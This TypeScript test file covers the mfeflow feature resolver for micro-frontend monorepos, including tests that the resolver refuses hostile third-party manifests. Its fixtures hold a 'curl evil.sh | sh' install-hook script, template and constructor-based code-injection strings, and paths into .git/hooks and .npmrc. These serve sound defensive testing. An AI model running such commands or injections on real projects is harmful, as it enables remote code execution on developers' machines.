import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import type { FeatureManifest } from '@mfeflow/contracts';
import { applyPlan } from '../apply';
import { PlanBuilder, renderDiff, summarize, type ReadFile } from '../plan';
import type { MfeflowProject } from '../project';
import { rejection, thrown } from '../testing';
import type { LoadedFeature } from './load';
import { parseFeature } from './load';
import { resolveFeature, resolveOptions } from './resolve';

const project: MfeflowProject = {
  version: 1,
  topology: 'monorepo',
  packageManager: 'pnpm',
  scope: '@shopco',
  apps: {
    shell: { kind: 'shell', path: 'apps/shell' },
    catalog: { kind: 'remote', path: 'apps/catalog' },
    cart: { kind: 'remote', path: 'apps/cart' },
  },
  features: { tsconfig: { version: '1.0.0' } },
};

const withPorts: MfeflowProject = {
  ...project,
  apps: { ...project.apps, cart: { kind: 'remote', path: 'apps/cart', port: 4312 } },
};

const pkg = (extra: object = {}) => `${JSON.stringify({ name: 'x', ...extra }, null, 2)}\n`;

const tree: Record<string, string> = {
  'apps/shell/package.json': pkg({ scripts: { build: 'rsbuild build' } }),
  'apps/catalog/package.json': pkg(),
  'apps/cart/package.json': pkg(),
  'package.json': pkg(),
  'apps/shell/src/app/providers.tsx': `export function Providers({ children }) {\n  return <A>{children}</A>;\n}\n`,
  'apps/shell/src/bootstrap.tsx': `export async function main() {\n  await go();\n}\n`,
  'apps/shell/env.ts': `export const env = createEnv({\n  server: {\n    PORT: z.number(),\n  },\n});\n`,
  'apps/shell/.env.example': 'PORT=3000\n',
  'apps/shell/src/config/schema.ts': `export const runtimeConfigSchema = z.object({\n  API: z.string(),\n});\n`,
  'apps/shell/public/config/runtime-config.dev.json': '{\n  "API": "/api"\n}\n',
  'apps/shell/public/config/runtime-config.prod.json': '{\n  "API": "/api"\n}\n',
};
const reader =
  (files: Record<string, string> = tree): ReadFile =>
  (f) =>
    Promise.resolve(files[f]);

const local = (manifest: FeatureManifest, assets: Record<string, string> = {}): LoadedFeature => ({
  manifest,
  trust: 'first-party',
  readAsset: (rel) => Promise.resolve(assets[rel] ?? ''),
});

const analytics: FeatureManifest = {
  name: 'analytics-gtm',
  version: '0.3.0',
  prompts: [
    { name: 'consent', type: 'select', choices: ['denied', 'granted'], default: 'denied' },
    { name: 'debug', type: 'boolean' },
  ],
  requires: ['tsconfig'],
  files: [
    { to: 'src/platform/consent.ts', target: 'shell', from: 'consent.eta', template: true },
    { to: 'src/analytics.ts', target: 'remotes', content: "export const app = '{{literal}}';\n" },
  ],
  dependencies: [
    { name: 'react', range: '^19.0.0', target: 'shell' },
    { name: 'vitest', range: '^5.0.0', dev: true },
  ],
  scripts: [{ name: 'analytics:check', command: 'node check.js', target: 'shell' }],
  transforms: [
    {
      op: 'wrap-provider',
      file: 'src/app/providers.tsx',
      target: 'shell',
      component: 'Consent',
      from: '../platform/consent',
      props: { mode: 'denied' },
    },
    {
      op: 'add-boot-step',
      file: 'src/bootstrap.tsx',
      target: 'shell',
      call: 'initAnalytics',
      from: './platform/consent',
    },
    {
      op: 'add-env-key',
      file: 'env.ts',
      target: 'shell',
      key: 'GTM_ID',
      scope: 'server',
      schema: 'z.string()',
      value: 'GTM-1',
    },
    {
      op: 'add-env-key',
      file: 'src/config/schema.ts',
      target: 'shell',
      key: 'GTM_URL',
      scope: 'runtime',
      schema: 'z.string().url()',
      value: 'https://example.com',
      configFiles: [
        'public/config/runtime-config.dev.json',
        'public/config/runtime-config.prod.json',
      ],
    },
  ],
};

const assets = {
  'consent.eta':
    "export const scope = '<%= it.scope %>';\nexport const mode = '<%= it.options.consent %>';\nexport const app = '<%= it.app.name %>';\n",
};

describe('resolveFeature', () => {
  it('turns a feature into one plan: files, deps, scripts and transforms across targets', async () => {
    const builder = new PlanBuilder(reader());
    await resolveFeature({
      feature: local(analytics, assets),
      project,
      builder,
      options: { consent: 'granted' },
    });
    const plan = builder.build();
    const after = (p: string) => plan.changes.find((c) => c.path === p)?.after ?? '';

    expect(after('apps/shell/src/platform/consent.ts')).toBe(
      "export const scope = '@shopco';\nexport const mode = 'granted';\nexport const app = 'shell';\n",
    );
    expect(
      plan.changes.filter((c) => c.path.endsWith('src/analytics.ts')).map((c) => c.path),
    ).toEqual(['apps/cart/src/analytics.ts', 'apps/catalog/src/analytics.ts']);
    expect(after('apps/shell/package.json')).toContain('"react": "^19.0.0"');
    expect(after('apps/shell/package.json')).toContain('"analytics:check": "node check.js"');
    expect(after('package.json')).toContain('"vitest": "^5.0.0"');
    expect(after('apps/shell/src/app/providers.tsx')).toContain('<Consent mode="denied">');
    expect(after('apps/shell/src/bootstrap.tsx')).toContain('await initAnalytics();');
    expect(after('apps/shell/env.ts')).toContain('GTM_ID: z.string()');
    expect(after('apps/shell/.env.example')).toBe('PORT=3000\nGTM_ID=GTM-1\n');
    expect(after('apps/shell/src/config/schema.ts')).toContain('GTM_URL: z.string().url()');
    expect(after('apps/shell/public/config/runtime-config.prod.json')).toContain(
      '"GTM_URL": "https://example.com"',
    );

    expect(plan.features).toEqual([
      { name: 'analytics-gtm', version: '0.3.0', options: { consent: 'granted', debug: false } },
    ]);
    expect(plan.env.map((e) => e.key)).toEqual(['GTM_ID', 'GTM_URL']);
    expect(plan.scripts).toHaveLength(1);
    expect(summarize(plan)).toContain('analytics:check');
    expect(renderDiff(plan)).toContain('+++ b/apps/shell/src/platform/consent.ts');
  });

  it('applies a part with a when only if every option it names matches', async () => {
    const choose: FeatureManifest = {
      name: 'validators',
      version: '1.0.0',
      prompts: [
        { name: 'validator', type: 'select', choices: ['zod', 'valibot'], default: 'zod' },
        { name: 'strict', type: 'boolean', default: false },
      ],
      files: [
        { to: 'a-zod.txt', target: 'shell', content: 'z', when: { validator: 'zod' } },
        { to: 'a-valibot.txt', target: 'shell', content: 'v', when: { validator: 'valibot' } },
        {
          to: 'a-both.txt',
          target: 'shell',
          content: 'b',
          when: { validator: 'zod', strict: true },
        },
        { to: 'a-always.txt', target: 'shell', content: 'a' },
      ],
      dependencies: [
        { name: 'zod', range: '4.0.0', target: 'shell', when: { validator: 'zod' } },
        { name: 'valibot', range: '1.0.0', target: 'shell', when: { validator: 'valibot' } },
      ],
      scripts: [
        { name: 'check', command: 'zod-check', target: 'shell', when: { validator: 'zod' } },
        { name: 'check-v', command: 'v-check', target: 'shell', when: { validator: 'valibot' } },
      ],
      transforms: [
        {
          op: 'add-import',
          file: 'src/bootstrap.tsx',
          target: 'shell',
          from: 'valibot',
          named: ['x'],
          when: { validator: 'valibot' },
        },
      ],
    };
    const run = async (options: Record<string, unknown>) => {
      const builder = new PlanBuilder(reader());
      await resolveFeature({ feature: local(choose), project, builder, options });
      return builder.build();
    };
    const zod = await run({});
    expect(zod.changes.map((c) => c.path)).toEqual([
      'apps/shell/a-always.txt',
      'apps/shell/a-zod.txt',
      'apps/shell/package.json',
    ]);
    expect(zod.dependencies.map((d) => d.name)).toEqual(['zod']);
    expect(zod.scripts.map((s) => s.name)).toEqual(['check']);
    const valibot = await run({ validator: 'valibot', strict: true });
    expect(valibot.changes.map((c) => c.path)).toEqual([
      'apps/shell/a-always.txt',
      'apps/shell/a-valibot.txt',
      'apps/shell/package.json',
      'apps/shell/src/bootstrap.tsx',
    ]);
    expect(valibot.dependencies.map((d) => d.name)).toEqual(['valibot']);
    const strict = await run({ strict: true });
    expect(strict.changes.map((c) => c.path)).toContain('apps/shell/a-both.txt');
  });

  it('applies a part with feature:<name> only when that feature is installed or being added', async () => {
    const adaptive: FeatureManifest = {
      name: 'adaptive',
      version: '1.0.0',
      files: [
        { to: 'with-env.txt', target: 'shell', content: 'a', when: { 'feature:env-t3': true } },
        { to: 'no-env.txt', target: 'shell', content: 'b', when: { 'feature:env-t3': false } },
      ],
    };
    const run = async (extra: Partial<Parameters<typeof resolveFeature>[0]>, installed = false) => {
      const builder = new PlanBuilder(reader());
      const withEnv = {
        ...project,
        features: installed ? { 'env-t3': { version: '0.1.0' } } : {},
      };
      await resolveFeature({ feature: local(adaptive), project: withEnv, builder, ...extra });
      return builder.build().changes.map((c) => c.path);
    };
    expect(await run({})).toEqual(['apps/shell/no-env.txt']);
    expect(await run({}, true)).toEqual(['apps/shell/with-env.txt']);
    expect(await run({ alsoAdding: ['env-t3', 'adaptive'] })).toEqual(['apps/shell/with-env.txt']);
  });

  it('fills the app name into a file destination, and writes it from the root with atRoot', async () => {
    const perApp: FeatureManifest = {
      name: 'per-app',
      version: '1.0.0',
      files: [
        {
          to: 'packages/contracts/src/routes/{{app.name}}.ts',
          target: 'remotes',
          atRoot: true,
          content: '// {{app.name}}\n',
          template: false,
        },
        { to: 'src/{{app.name}}.ts', target: 'remotes', content: 'x' },
      ],
    };
    const builder = new PlanBuilder(reader());
    await resolveFeature({ feature: local(perApp), project, builder });
    expect(builder.build().changes.map((c) => c.path)).toEqual([
      'apps/cart/src/cart.ts',
      'apps/catalog/src/catalog.ts',
      'packages/contracts/src/routes/cart.ts',
      'packages/contracts/src/routes/catalog.ts',
    ]);
  });

  it('writes an atRoot file once however many times its destination is asked for', async () => {
    const twice: FeatureManifest = {
      name: 'twice',
      version: '1.0.0',
      files: [{ to: 'packages/shared/index.ts', target: 'remotes', atRoot: true, content: 'x' }],
    };
    const builder = new PlanBuilder(reader());
    await resolveFeature({ feature: local(twice), project, builder });
    expect(builder.build().changes.map((c) => c.path)).toEqual(['packages/shared/index.ts']);
  });

  it('names a dependency in the project scope with {{scope}}', async () => {
    const scoped: FeatureManifest = {
      name: 'scoped',
      version: '1.0.0',
      dependencies: [
        { name: '{{scope}}/contracts', range: 'workspace:*', target: 'remotes' },
        { name: '{{scope}}/contracts', range: 'workspace:*', target: 'shell' },
      ],
    };
    const builder = new PlanBuilder(reader());
    await resolveFeature({ feature: local(scoped), project, builder });
    expect(builder.build().dependencies).toEqual(
      ['catalog', 'cart', 'shell'].map((app) => ({
        file: `apps/${app}/package.json`,
        name: '@shopco/contracts',
        range: 'workspace:*',
        dev: false,
      })),
    );
  });

  it('refuses atRoot and a scoped dependency from a third-party feature, even if the loader was bypassed (E203)', async () => {
    const attempts: FeatureManifest[] = [
      { name: '@acme/a', version: '1', files: [{ to: 'src/x.ts', atRoot: true, content: 'x' }] },
      {
        name: '@acme/b',
        version: '1',
        dependencies: [{ name: '{{scope}}/contracts', range: '^1.0.0' }],
      },
    ];
    for (const manifest of attempts) {
      const feature: LoadedFeature = { manifest, trust: 'third-party' };
      const error = await rejection(
        resolveFeature({ feature, project, builder: new PlanBuilder(reader()) }),
      );
      expect(error.code).toBe('MFEFLOW_E203');
    }
  });

  it('creates runtime-config.json for a first runtime key and adds the next to it', async () => {
    const key = (name: string): FeatureManifest => ({
      name: `adds-${name}`,
      version: '1.0.0',
      transforms: [
        {
          op: 'add-env-key',
          file: 'public/config/runtime-config.json',
          target: 'shell',
          key: name,
          scope: 'runtime',
          schema: 'z.string()',
          value: name === 'b' ? ['x'] : 'v',
        },
      ],
    });
    const builder = new PlanBuilder(reader());
    await resolveFeature({ feature: local(key('a')), project, builder });
    await resolveFeature({ feature: local(key('b')), project, builder });
    const change = builder.build().changes.find((c) => c.path.endsWith('runtime-config.json'));
    expect(change?.after).toBe('{\n  "a": "v",\n  "b": [\n    "x"\n  ]\n}\n');
  });

  it('lists a server key in turbo.json when the project has one', async () => {
    const files = { ...tree, 'turbo.json': '{\n  "tasks": {}\n}\n' };
    const builder = new PlanBuilder(reader(files));
    await resolveFeature({ feature: local(analytics, assets), project, builder });
    const turbo = builder.build().changes.find((c) => c.path === 'turbo.json');
    expect(JSON.parse(turbo?.after ?? '{}')).toEqual({ tasks: {}, globalEnv: ['GTM_ID'] });

    const noTurbo = new PlanBuilder(reader());
    await resolveFeature({ feature: local(analytics, assets), project, builder: noTurbo });
    expect(noTurbo.build().changes.map((c) => c.path)).not.toContain('turbo.json');
  });

  it('gives templates the dev server port of the app', async () => {
    const builder = new PlanBuilder(reader());
    const feature = local(
      {
        name: 'ports',
        version: '1.0.0',
        files: [{ to: 'port.txt', target: 'remotes', from: 'port.eta', template: true }],
      },
      { 'port.eta': '<%= it.app.name %>:<%= it.app.port ?? "none" %>\n' },
    );
    await resolveFeature({ feature, project: withPorts, builder });
    const files = Object.fromEntries(builder.build().changes.map((c) => [c.path, c.after]));
    expect(files['apps/cart/port.txt']).toBe('cart:4312\n');
    expect(files['apps/catalog/port.txt']).toBe('catalog:none\n');
  });

  it('creates a missing .env.example, and fails clearly when a config file is missing', async () => {
    const files = { ...tree };
    delete files['apps/shell/.env.example'];
    const builder = new PlanBuilder(reader(files));
    await resolveFeature({
      feature: local({
        name: 'e',
        version: '1',
        transforms: [
          {
            op: 'add-env-key',
            file: 'env.ts',
            target: 'shell',
            key: 'K',
            scope: 'server',
            schema: 'z.string()',
          },
        ],
      }),
      project,
      builder,
    });
    expect(builder.build().changes.find((c) => c.path === 'apps/shell/.env.example')?.after).toBe(
      'K=\n',
    );

    const missing = new PlanBuilder(reader({ ...tree }));
    const feature = local({
      name: 'e',
      version: '1',
      transforms: [
        {
          op: 'add-env-key',
          file: 'src/config/schema.ts',
          target: 'shell',
          key: 'K',
          scope: 'runtime',
          schema: 'z.string()',
          configFiles: ['public/config/runtime-config.staging.json'],
        },
      ],
    });
    expect((await rejection(resolveFeature({ feature, project, builder: missing }))).code).toBe(
      'MFEFLOW_E208',
    );
  });

  it('records mfeflow.json as planned against, so apply can notice a later edit', async () => {
    const builder = new PlanBuilder(reader({ ...tree, 'mfeflow.json': '{"version":1}\n' }));
    await resolveFeature({ feature: local({ name: 'a', version: '1' }), project, builder });
    expect(builder.build().projectBefore).toBe('{"version":1}\n');
    const bare = new PlanBuilder(reader());
    await resolveFeature({ feature: local({ name: 'a', version: '1' }), project, builder: bare });
    expect(bare.build().projectBefore).toBeNull();
  });

  it('is idempotent: resolving twice on the same builder changes nothing more', async () => {
    const builder = new PlanBuilder(reader());
    const input = { feature: local(analytics, assets), project, builder };
    await resolveFeature(input);
    const once = JSON.stringify(builder.build().changes);
    await resolveFeature(input);
    expect(JSON.stringify(builder.build().changes)).toBe(once);
  });

  it('uses the catalog for dependencies when the builder is catalog-aware', async () => {
    const files = { ...tree, 'pnpm-workspace.yaml': 'catalog:\n  react: 19.3.1\n' };
    const builder = new PlanBuilder(reader(files), { catalog: true });
    await resolveFeature({
      feature: local({
        name: 'f',
        version: '1',
        dependencies: [{ name: 'react', range: '^19', target: 'shell' }],
      }),
      project,
      builder,
    });
    expect(builder.build().dependencies[0]?.range).toBe('catalog:');
  });

  it('checks conflicts and requirements, counting features added in the same command', async () => {
    const builder = new PlanBuilder(reader());
    const conflict = local({ name: 'a', version: '1', conflicts: ['tsconfig'] });
    expect((await rejection(resolveFeature({ feature: conflict, project, builder }))).code).toBe(
      'MFEFLOW_E205',
    );
    const needs = local({ name: 'a', version: '1', requires: ['lint-oxlint'] });
    expect((await rejection(resolveFeature({ feature: needs, project, builder }))).code).toBe(
      'MFEFLOW_E206',
    );
    await resolveFeature({ feature: needs, project, builder, alsoAdding: ['lint-oxlint'] });
    const conflictLater = local({ name: 'a', version: '1', conflicts: ['lint-eslint'] });
    expect(
      (
        await rejection(
          resolveFeature({ feature: conflictLater, project, builder, alsoAdding: ['lint-eslint'] }),
        )
      ).code,
    ).toBe('MFEFLOW_E205');
  });

  it('reports a file that already exists with other content (E207) and a missing target app (E208)', async () => {
    const builder = new PlanBuilder(reader({ ...tree, 'apps/shell/a.ts': 'mine' }));
    const clash = local({
      name: 'a',
      version: '1',
      files: [{ to: 'a.ts', target: 'shell', content: 'theirs' }],
    });
    expect((await rejection(resolveFeature({ feature: clash, project, builder }))).code).toBe(
      'MFEFLOW_E207',
    );
    const nowhere = local({
      name: 'a',
      version: '1',
      files: [{ to: 'a.ts', target: 'checkout', content: 'x' }],
    });
    expect((await rejection(resolveFeature({ feature: nowhere, project, builder }))).code).toBe(
      'MFEFLOW_E208',
    );
  });

  it('refuses unsafe destinations for any feature (E105), including app paths from a tampered mfeflow.json', async () => {
    const builder = new PlanBuilder(reader());
    const targets = [
      '.git/hooks/pre-commit',
      '.GIT/hooks/pre-commit',
      '.git',
      'node_modules/x/index.js',
      'MFEFLOW.json',
      'src/aux.ts',
    ];
    const errors = await Promise.all(
      targets.map((to) => {
        const feature = local({ name: 'a', version: '1', files: [{ to, content: 'x' }] });
        return rejection(resolveFeature({ feature, project, builder }));
      }),
    );
    expect(errors.map((e) => e.code)).toEqual(targets.map(() => 'MFEFLOW_E105'));
    const tampered = {
      ...project,
      apps: { shell: { kind: 'shell' as const, path: '../outside' } },
    };
    const feature = local({
      name: 'a',
      version: '1',
      files: [{ to: 'a.ts', target: 'shell', content: 'x' }],
    });
    expect((await rejection(resolveFeature({ feature, project: tampered, builder }))).code).toBe(
      'MFEFLOW_E105',
    );
  });

  it('reports a template error as E209', async () => {
    const feature = local(
      { name: 'a', version: '1', files: [{ to: 'a.ts', from: 'bad.eta', template: true }] },
      { 'bad.eta': '<%= it.nope.deeper %>' },
    );
    expect(
      (await rejection(resolveFeature({ feature, project, builder: new PlanBuilder(reader()) })))
        .code,
    ).toBe('MFEFLOW_E209');
  });

  it('reports a file with neither content nor a readable source as E202', async () => {
    const feature: LoadedFeature = {
      manifest: { name: 'a', version: '1', files: [{ to: 'src/a.ts', from: 'x' }] },
      trust: 'third-party',
    };
    expect(
      (await rejection(resolveFeature({ feature, project, builder: new PlanBuilder(reader()) })))
        .code,
    ).toBe('MFEFLOW_E202');
  });
});

const third = (extra: object) =>
  ({
    manifest: parseFeature(
      JSON.stringify({ name: '@acme/x', version: '1.0.0', ...extra }),
      'third-party',
      'x',
    ),
    trust: 'third-party',
  }) as LoadedFeature;

const env = (schema: string): LoadedFeature => ({
  manifest: {
    name: '@acme/x',
    version: '1',
    transforms: [
      {
        op: 'add-env-key',
        file: 'src/config/schema.ts',
        target: 'shell',
        key: 'SEGMENT_URL',
        scope: 'runtime',
        schema,
        configFiles: ['public/config/runtime-config.dev.json'],
      },
    ],
  },
  trust: 'third-party',
});

const withStep = (trust: LoadedFeature['trust']): LoadedFeature => ({
  manifest: {
    name: trust === 'first-party' ? 'ci-extra' : '@acme/x',
    version: '1',
    transforms: [
      {
        op: 'add-workflow-step',
        file: '.github/workflows/ci.yml',
        job: 'build',
        step: { name: 'Check', run: 'pnpm check' },
      },
    ],
  },
  trust,
});

describe('workflow steps', () => {
  const workflow = `jobs:\n  build:\n    steps:\n      - name: Install\n        run: pnpm install\n`;
  it('flags a first-party CI change in the plan summary', async () => {
    const builder = new PlanBuilder(reader({ ...tree, '.github/workflows/ci.yml': workflow }));
    await resolveFeature({ feature: withStep('first-party'), project, builder });
    const plan = builder.build();
    expect(plan.warnings).toEqual([
      'ci-extra edits the CI workflow .github/workflows/ci.yml (adds step "Check")',
    ]);
    expect(summarize(plan)).toContain('Warning: ci-extra edits the CI workflow');
  });

  it('refuses a third-party CI change at resolve time even if the loader was bypassed', async () => {
    const builder = new PlanBuilder(reader({ ...tree, '.github/workflows/ci.yml': workflow }));
    const error = await rejection(
      resolveFeature({ feature: withStep('third-party'), project, builder }),
    );
    expect(error.code).toBe('MFEFLOW_E203');
  });
});

describe('third-party features at resolve time', () => {
  it('substitutes {{options}} and never evaluates template syntax', async () => {
    Reflect.deleteProperty(globalThis, 'pwned');
    const evil =
      '<%= globalThis.pwned = 1 %>\n${globalThis.pwned = 1}\nregion={{options.region}} app={{app.name}}\n';
    const feature = third({
      prompts: [{ name: 'region', type: 'select', choices: ['us', 'eu'], default: 'eu' }],
      files: [{ to: 'src/a.ts', target: 'shell', content: evil, template: true }],
    });
    const builder = new PlanBuilder(reader());
    await resolveFeature({ feature, project, builder });
    const content = builder.build().changes.find((c) => c.path === 'apps/shell/src/a.ts')?.after;
    expect(content).toBe(
      '<%= globalThis.pwned = 1 %>\n${globalThis.pwned = 1}\nregion=eu app=shell\n',
    );
    expect(Reflect.get(globalThis, 'pwned')).toBeUndefined();
  });

  it('marks every file a third-party feature touched as third-party, and keeps it so', async () => {
    const builder = new PlanBuilder(reader());
    await resolveFeature({
      feature: local(analytics, assets),
      project,
      builder,
      options: { consent: 'granted' },
    });
    await resolveFeature({
      feature: third({
        files: [{ to: 'src/a.ts', target: 'shell', content: 'a' }],
        dependencies: [{ name: 'left-pad', range: '^1.0.0', target: 'shell' }],
      }),
      project,
      builder,
    });
    const trust = Object.fromEntries(builder.build().changes.map((c) => [c.path, c.trust]));
    expect(trust['apps/shell/src/a.ts']).toBe('third-party');
    expect(trust['apps/shell/package.json']).toBe('third-party');
    expect(trust['apps/shell/src/platform/consent.ts']).toBe('first-party');
  });

  it('copies untemplated content byte for byte', async () => {
    const body = '<%= globalThis.pwned = 1 %> {{ not.substituted }}';
    const builder = new PlanBuilder(reader());
    await resolveFeature({
      feature: third({ files: [{ to: 'src/a.txt', content: body }] }),
      project,
      builder,
    });
    expect(builder.build().changes[0]?.after).toBe(body);
    expect(Reflect.get(globalThis, 'pwned')).toBeUndefined();
  });

  it('refuses hook-like scripts at resolve time even if the loader was bypassed', async () => {
    const names = ['prebuild', 'pnpm:devPreinstall', 'postinstall'];
    const errors = await Promise.all(
      names.map((name) => {
        const feature: LoadedFeature = {
          manifest: {
            name: '@acme/x',
            version: '1',
            scripts: [{ name, command: 'curl evil.sh | sh', target: 'shell' }],
          },
          trust: 'third-party',
        };
        return rejection(resolveFeature({ feature, project, builder: new PlanBuilder(reader()) }));
      }),
    );
    expect(errors.map((e) => e.code)).toEqual(names.map(() => 'MFEFLOW_E203'));
  });

  it('never overwrites an existing script (E207); a third-party feature cannot even name it (E203)', async () => {
    const scripts = [{ name: 'build', command: 'curl evil.sh | sh', target: 'shell' }];
    const features: LoadedFeature[] = [
      { manifest: { name: 'a', version: '1', scripts }, trust: 'first-party' },
      { manifest: { name: '@acme/x', version: '1', scripts }, trust: 'third-party' },
    ];
    const errors = await Promise.all(
      features.map((feature) =>
        rejection(resolveFeature({ feature, project, builder: new PlanBuilder(reader()) })),
      ),
    );
    expect(errors.map((e) => e.code)).toEqual(['MFEFLOW_E207', 'MFEFLOW_E203']);
  });

  it('writes plain scripts, shown in the plan and never run', async () => {
    const feature = third({
      scripts: [{ name: 'x:check', command: 'node check.js', target: 'shell' }],
    });
    const builder = new PlanBuilder(reader());
    await resolveFeature({ feature, project, builder });
    expect(summarize(builder.build())).toContain('not run');
  });

  it('writes only under src, public and docs, even if the loader was bypassed', async () => {
    const attempts: { to: string; target?: string }[] = [
      { to: '.pnpmfile.mjs' },
      { to: '.PnpmFile.mjs', target: 'shell' },
      { to: 'rsbuild.config.ts', target: 'shell' },
      { to: 'features/evil/feature.json' },
      { to: 'src/.husky/pre-commit', target: 'shell' },
    ];
    const errors = await Promise.all(
      attempts.map((attempt) => {
        const feature: LoadedFeature = {
          manifest: { name: '@acme/x', version: '1', files: [{ ...attempt, content: 'x' }] },
          trust: 'third-party',
        };
        return rejection(resolveFeature({ feature, project, builder: new PlanBuilder(reader()) }));
      }),
    );
    expect(errors.map((e) => e.code)).toEqual(attempts.map(() => 'MFEFLOW_E203'));
  });

  it('refuses a transform on a file outside the allowlist at resolve time', async () => {
    const feature: LoadedFeature = {
      manifest: {
        name: '@acme/x',
        version: '1',
        transforms: [{ op: 'add-import', file: 'rsbuild.config.ts', target: 'shell', from: 'x' }],
      },
      trust: 'third-party',
    };
    const builder = new PlanBuilder(reader({ ...tree, 'apps/shell/rsbuild.config.ts': '' }));
    expect((await rejection(resolveFeature({ feature, project, builder }))).code).toBe(
      'MFEFLOW_E203',
    );
  });

  it('writes the env schema from the parsed tree, not the text it was given', async () => {
    const builder = new PlanBuilder(reader());
    await resolveFeature({
      feature: env('z.string( ).url() /* }, EVIL: process.exit() */'),
      project,
      builder,
    });
    const schema = builder.build().changes.find((c) => c.path.endsWith('schema.ts'));
    expect(schema?.after).toContain('SEGMENT_URL: z.string().url()');
    expect(schema?.after).not.toContain('EVIL');
    const attack = rejection(
      resolveFeature({
        feature: env('z.constructor.constructor("return process")()'),
        project,
        builder: new PlanBuilder(reader()),
      }),
    );
    expect((await attack).code).toBe('MFEFLOW_E203');
  });

  it('refuses protected files at resolve time even if the loader was bypassed', async () => {
    const feature: LoadedFeature = {
      manifest: { name: '@acme/x', version: '1', files: [{ to: '.npmrc', content: 'x' }] },
      trust: 'third-party',
    };
    expect(
      (await rejection(resolveFeature({ feature, project, builder: new PlanBuilder(reader()) })))
        .code,
    ).toBe('MFEFLOW_E203');
  });
});

describe('resolveOptions', () => {
  const manifest: FeatureManifest = {
    name: 'f',
    version: '1',
    prompts: [
      { name: 'region', type: 'select', choices: ['us', 'eu'], default: 'us' },
      { name: 'label', type: 'string' },
      { name: 'on', type: 'boolean', default: true },
    ],
  };

  it('fills defaults and keeps given values', () => {
    expect(resolveOptions(manifest, { label: 'x', on: false })).toEqual({
      region: 'us',
      label: 'x',
      on: false,
    });
    expect(resolveOptions({ name: 'f', version: '1' })).toEqual({});
  });

  it.each([
    [{ label: 'x', region: 'asia' }],
    [{ label: 'x', bogus: 1 }],
    [{}],
    [{ label: 3 }],
    [{ label: 'x', on: 'yes' }],
  ])('rejects %j with E214', (given) => {
    expect(thrown(() => resolveOptions(manifest, given)).code).toBe('MFEFLOW_E214');
  });
});

describe('plan, apply and re-plan against a real folder', () => {
  it('writes the feature, records it, and a second add plans nothing', async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), 'mfeflow-e2e-'));
    try {
      await Promise.all(
        Object.entries(tree).map(async ([file, content]) => {
          await fs.mkdir(path.dirname(path.join(root, file)), { recursive: true });
          await fs.writeFile(path.join(root, file), content);
        }),
      );
      const read: ReadFile = (f) => fs.readFile(path.join(root, f), 'utf8').catch(() => undefined);
      const plan = async () => {
        const builder = new PlanBuilder(read);
        await resolveFeature({ feature: local(analytics, assets), project, builder });
        return builder.build();
      };
      const first = await plan();
      const result = await applyPlan(first, { root, project });
      expect(result.project?.features['analytics-gtm']?.version).toBe('0.3.0');
      expect(result.project?.files?.['apps/shell/src/platform/consent.ts']).toMatch(/^sha256-/);
      expect(
        await fs.readFile(path.join(root, 'apps/shell/src/platform/consent.ts'), 'utf8'),
      ).toContain('@shopco');
      expect((await plan()).changes).toEqual([]);
    } finally {
      await fs.rm(root, { recursive: true, force: true });
    }
  });
});
